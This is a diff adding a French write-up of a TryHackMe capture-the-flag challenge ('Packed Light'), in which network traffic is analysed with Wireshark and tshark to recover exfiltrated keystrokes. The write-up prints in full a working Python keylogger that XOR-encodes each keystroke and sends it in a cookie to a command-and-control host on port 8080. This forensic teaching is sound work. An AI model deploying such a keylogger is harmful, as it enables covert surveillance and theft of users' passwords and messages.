@@ -462,6 +462,134 @@ Le flag se cache dans les données récupérées.
 
 ## Jour 4 : [*Packed Light*](https://tryhackme.com/room/hh-packedlight-02e5330c)
 
+L'exercice consiste à analyser une capture de trafic réseau avec WireShark. Dans le contenu de la mission, il y a un message de l'utilisateur `0xMia` qui indique que sa machine se connecte régulièrement au port 8080 d'une machine distante.
+
+```txt
+not me watching my laptop ping some random :8080 address every single second like clockwork 🚩 the request headers are giving 'not a real app' ngl also what is with the crypto 😭 #HackerHolidays
+```
+
+Une recherche ciblant ce port de destination avec `tcp.dstport == 8080` met en lumière un trafic {% include dictionary.html word="HTTP" %}. Le paquet 16 indique une connexion sur une page `/temp/updates.py` plus que suspecte.
+
+Suivre le flux HTTP permet de récupérer un script Python de Key Logger (un outil permettant d'enregister les touches du clavier appuyées par l'utilisateur)
+
+{% capture spoil %}
+
+```py
+import requests
+import base64
+from pynput import keyboard
+
+C2_URL = "http://byte-lotus-hotel.thm:8080/"
+
+def getkey():
+    p1 = "H0t3lSt@ff0Nly"
+    p2 = "K3epS3cr3t!"
+    return p1 + p2
+
+def xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def sendltr(character):
+    raw_bytes = character.encode('utf-8')
+    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
+    
+    b64_string = base64.b64encode(encrypted).decode('utf-8')
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
+        "Cookie": f"hotel_sess_state={b64_string}"
+    }    
+    try:
+        requests.get(C2_URL, headers=headers, timeout=0.5)
+    except:
+        pass
+
+def on_press(key):
+    try:
+        sendltr(key.char)
+    except AttributeError:
+        if key == keyboard.Key.space:
+            sendltr(" ")
+        elif key == keyboard.Key.enter:
+            sendltr("\n")
+
+print("[*] Byte Lotus Sync Service started...")
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Pour la suite de l'investigation, il faudra analyser les paquets utilisant le **User-Agent** `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1` à la recherche du cookie `hotel_sess_state`.
+
+Le cookie cache un message qui a d'abord était encodé en XOR avec la clé `H0t3lSt@ff0NlyK3epS3cr3t!` puis en base64.
+
+Pour cette partie, l'utilisation de `tshark` en ligne de commande permet de récupérer rapidement l'ensemble des cookies :
+
+```bash
+tshark -r traffic.pcapng -Y 'http.user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1"' -T fields -e http.cookie
+```
+
+{% capture spoil %}
+
+```txt
+hotel_sess_state=HA==
+hotel_sess_state=AA==
+hotel_sess_state=BQ==
+hotel_sess_state=Mw==
+hotel_sess_state=Hg==
+hotel_sess_state=ew==
+hotel_sess_state=Og==
+hotel_sess_state=fA==
+hotel_sess_state=Fw==
+hotel_sess_state=eQ==
+hotel_sess_state=Ow==
+hotel_sess_state=Fw==
+hotel_sess_state=Pw==
+hotel_sess_state=fA==
+hotel_sess_state=PA==
+hotel_sess_state=Kw==
+hotel_sess_state=IA==
+hotel_sess_state=eQ==
+hotel_sess_state=Jg==
+hotel_sess_state=Lw==
+hotel_sess_state=Fw==
+hotel_sess_state=eA==
+hotel_sess_state=Pg==
+hotel_sess_state=LQ==
+hotel_sess_state=Gg==
+hotel_sess_state=Fw==
+hotel_sess_state=MQ==
+hotel_sess_state=eA==
+hotel_sess_state=PQ==
+hotel_sess_state=NQ==
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Chaque élément recherché étant composé de 2 lettres suivies de 2 signes '`=`', il est possible de récupérer les valeurs en redirigeant la requête vers `grep -oE "\w{2}={2}"` ou `rg -o "\w{2}={2}"` (`rg` ou `ripgrep` est une version plus moderne et plus rapide de `grep`) puis utiliser `tr` pour convertir les retours chariot en espace pour faciliter la conversion des données dans CyberChef
+
+```bash
+tshark -r traffic.pcapng -Y 'http.user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1"' -T fields -e http.cookie | rg -o "\w{2}={2} | tr "\n" " "
+```
+
+{% capture spoil %}
+
+```txt
+HA== AA== BQ== Mw== Hg== ew== Og== fA== Fw== eQ== Ow== Fw== Pw== fA== PA== Kw== IA== eQ== Jg== Lw== Fw== eA== Pg== LQ== Gg== Fw== MQ== eA== PQ== NQ==
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Chaque bloc représente une seule touche enregistrée. Ce qui signifie que la clé complète `H0t3lSt@ff0NlyK3epS3cr3t!` ne sert à rien : chaque entrée est convertie avec la première lettre de la clé, à savoir la lettre `H`.
+
+Il ne reste qu'à convertir le contenu en utilisant la bonne recette sur [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR({'option':'UTF8','string':'H'},'Standard',false))
+
+{% include elements/figure_spoil.html image="images/THM/HH2026/Capture_ecran_2026-08-22_CyberChef.png" caption="Récupération du message chiffré" %}
+
 ## Jour 5 : [*Beach Bar*](https://tryhackme.com/room/hh-beachbar-d849f7f7)
 
 ## Jour 6 : [*Overheard at Breakfast*](https://tryhackme.com/room/hh-overheardatbreakfast-6f01793c)
